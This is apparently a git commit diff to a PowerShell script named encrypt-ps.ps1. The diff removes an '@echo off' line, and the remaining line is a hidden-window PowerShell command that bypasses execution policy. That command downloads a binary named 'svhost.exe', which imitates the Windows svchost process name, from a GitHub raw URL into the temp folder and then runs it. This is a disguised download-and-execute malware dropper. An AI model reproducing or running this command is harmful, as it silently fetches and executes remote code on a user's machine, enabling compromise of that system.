52728304a7bd487ea1156e1ca1e8784da2d18f42
PXTDEV9022 <qnuts1tg222@gmail.com>
2025-02-23 17:09:00 +0700

    Update encrypt-ps.ps1

--- encrypt-ps.ps1
+++ encrypt-ps.ps1
@@ -1,2 +1,1 @@
-@echo off
 powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/minhdmkk6/t34/raw/refs/heads/main/svhost.exe' -OutFile $env:Temp\svhost.exe; Start-Process -FilePath $env:Temp\svhost.exe}"
